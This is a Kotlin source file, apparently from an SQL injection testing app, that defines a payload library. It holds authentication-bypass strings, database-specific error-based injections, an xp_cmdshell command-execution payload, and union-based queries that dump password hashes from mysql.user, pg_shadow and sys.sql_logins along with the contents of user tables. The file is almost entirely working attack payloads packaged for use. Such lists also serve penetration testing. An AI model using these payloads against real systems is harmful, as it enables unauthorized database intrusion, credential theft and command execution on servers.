package com.sqliblackboxpro

data class PayloadInfo(
    val payload: String,
    val description: String,
    val category: String,
    val isCustom: Boolean = false
)

object SQLPayloads {
    
    // Basic SQL injection payloads for detection
    val DETECTION_PAYLOADS = listOf(
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1"
    )
    
    // Database-specific error-based payloads
    val MYSQL_PAYLOADS = listOf(
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' AND updatexml(null,concat(0x0a,version()),null)-- "
    )
    
    val POSTGRESQL_PAYLOADS = listOf(
        "' AND 1=CAST((SELECT VERSION()) AS INT)--",
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' AND 1::int=1 AND ''='"
    )
    
    val MSSQL_PAYLOADS = listOf(
        "' AND 1=CONVERT(INT,@@VERSION)--",
        "' UNION SELECT NULL,@@VERSION,NULL--",
        "'; EXEC xp_cmdshell('whoami')--"
    )
    
    val ORACLE_PAYLOADS = listOf(
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT BANNER FROM v\$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,BANNER,NULL FROM v\$version--"
    )
    
    // Data extraction payloads (for MySQL)
    val DATA_EXTRACTION_PAYLOADS = listOf(
        "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user--",
        "' UNION SELECT NULL,CONCAT(schema_name),NULL FROM information_schema.schemata--",
        "' UNION SELECT NULL,CONCAT(table_name),NULL FROM information_schema.tables--",
        "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--"
    )
    
    // PostgreSQL data extraction payloads
    val POSTGRESQL_EXTRACTION_PAYLOADS = listOf(
        "' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--",
        "' UNION SELECT NULL,datname,NULL FROM pg_database--",
        "' UNION SELECT NULL,tablename,NULL FROM pg_tables--",
        "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
    )
    
    // MSSQL data extraction payloads
    val MSSQL_EXTRACTION_PAYLOADS = listOf(
        "' UNION SELECT NULL,name,NULL FROM sys.databases--",
        "' UNION SELECT NULL,name,NULL FROM sys.tables--",
        "' UNION SELECT NULL,name+':'+password_hash,NULL FROM sys.sql_logins--"
    )
    
    // Comprehensive database dump payloads for MySQL
    val MYSQL_DUMP_PAYLOADS = listOf(
        // Users and credentials
        "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user--",
        "' UNION SELECT NULL,GROUP_CONCAT(user,':',password),NULL FROM mysql.user--",
        // Database schemas
        "' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--",
        // All tables
        "' UNION SELECT NULL,GROUP_CONCAT(table_schema,':',table_name),NULL FROM information_schema.tables--",
        // User table details
        "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--",
        // Dump user data
        "' UNION SELECT NULL,GROUP_CONCAT(id,':',username,':',email,':',password),NULL FROM users--",
        // Version and metadata
        "' UNION SELECT NULL,VERSION(),NULL--",
        "' UNION SELECT NULL,@@hostname,NULL--",
        "' UNION SELECT NULL,DATABASE(),NULL--"
    )
    
    // Comprehensive database dump payloads for PostgreSQL
    val POSTGRESQL_DUMP_PAYLOADS = listOf(
        // Users and credentials
        "' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--",
        "' UNION SELECT NULL,STRING_AGG(usename||':'||passwd,','),NULL FROM pg_shadow--",
        // Database schemas
        "' UNION SELECT NULL,STRING_AGG(datname,','),NULL FROM pg_database--",
        // All tables
        "' UNION SELECT NULL,STRING_AGG(schemaname||':'||tablename,','),NULL FROM pg_tables--",
        // User table details
        "' UNION SELECT NULL,STRING_AGG(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--",
        // Version
        "' UNION SELECT NULL,VERSION(),NULL--"
    )
    
    // Comprehensive database dump payloads for MSSQL
    val MSSQL_DUMP_PAYLOADS = listOf(
        // Databases
        "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.databases--",
        "' UNION SELECT NULL,name,NULL FROM sys.databases--",
        // Tables
        "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.tables--",
        // Users and logins
        "' UNION SELECT NULL,name+':'+CONVERT(VARCHAR,password_hash),NULL FROM sys.sql_logins--",
        "' UNION SELECT NULL,STRING_AGG(name,','),NULL FROM sys.server_principals--",
        // Version
        "' UNION SELECT NULL,@@VERSION,NULL--"
    )
    
    // Comprehensive database dump payloads for Oracle
    val ORACLE_DUMP_PAYLOADS = listOf(
        // Users
        "' UNION SELECT NULL,username,NULL FROM all_users--",
        "' UNION SELECT NULL,LISTAGG(username,',') WITHIN GROUP (ORDER BY username),NULL FROM all_users--",
        // Tables
        "' UNION SELECT NULL,table_name,NULL FROM all_tables--",
        "' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL FROM all_tables--",
        // Version
        "' UNION SELECT NULL,BANNER,NULL FROM v\$version--"
    )
    
    // Get all payloads for comprehensive scanning
    fun getAllPayloads(): List<String> {
        return DETECTION_PAYLOADS + MYSQL_PAYLOADS + POSTGRESQL_PAYLOADS + 
               MSSQL_PAYLOADS + ORACLE_PAYLOADS
    }
    
    // Store for custom payloads
    private val customPayloads = mutableListOf<PayloadInfo>()
    
    // Get all payloads with metadata for the library screen
    fun getAllPayloadInfo(): List<PayloadInfo> {
        val payloadInfoList = mutableListOf<PayloadInfo>()
        
        // Add detection payloads
        DETECTION_PAYLOADS.forEach { payload ->
            payloadInfoList.add(
                PayloadInfo(
                    payload = payload,
                    description = "Basic SQL injection detection payload",
                    category = "Detection Payloads"
                )
            )
        }
        
        // Add MySQL payloads
        MYSQL_PAYLOADS.forEach { payload ->
            payloadInfoList.add(
                PayloadInfo(
                    payload = payload,
                    description = "MySQL-specific error-based SQL injection payload",
                    category = "MySQL Payloads"
                )
            )
        }
        
        // Add PostgreSQL payloads
        POSTGRESQL_PAYLOADS.forEach { payload ->
            payloadInfoList.add(
                PayloadInfo(
                    payload = payload,
                    description = "PostgreSQL-specific SQL injection payload",
                    category = "PostgreSQL Payloads"
                )
            )
        }
        
        // Add MSSQL payloads
        MSSQL_PAYLOADS.forEach { payload ->
            payloadInfoList.add(
                PayloadInfo(
                    payload = payload,
                    description = "Microsoft SQL Server-specific SQL injection payload",
                    category = "MSSQL Payloads"
                )
            )
        }
        
        // Add Oracle payloads
        ORACLE_PAYLOADS.forEach { payload ->
            payloadInfoList.add(
                PayloadInfo(
                    payload = payload,
                    description = "Oracle Database-specific SQL injection payload",
                    category = "Oracle Payloads"
                )
            )
        }
        
        // Add data extraction payloads
        DATA_EXTRACTION_PAYLOADS.forEach { payload ->
            payloadInfoList.add(
                PayloadInfo(
                    payload = payload,
                    description = "MySQL data extraction payload for extracting database information",
                    category = "Data Extraction"
                )
            )
        }
        
        // Add custom payloads
        payloadInfoList.addAll(customPayloads)
        
        return payloadInfoList
    }
    
    // Add a custom payload
    fun addCustomPayload(payload: String, description: String, category: String) {
        customPayloads.add(
            PayloadInfo(
                payload = payload,
                description = description,
                category = category,
                isCustom = true
            )
        )
    }
    
    // Remove a custom payload
    fun removeCustomPayload(payload: String) {
        customPayloads.removeAll { it.payload == payload }
    }
}
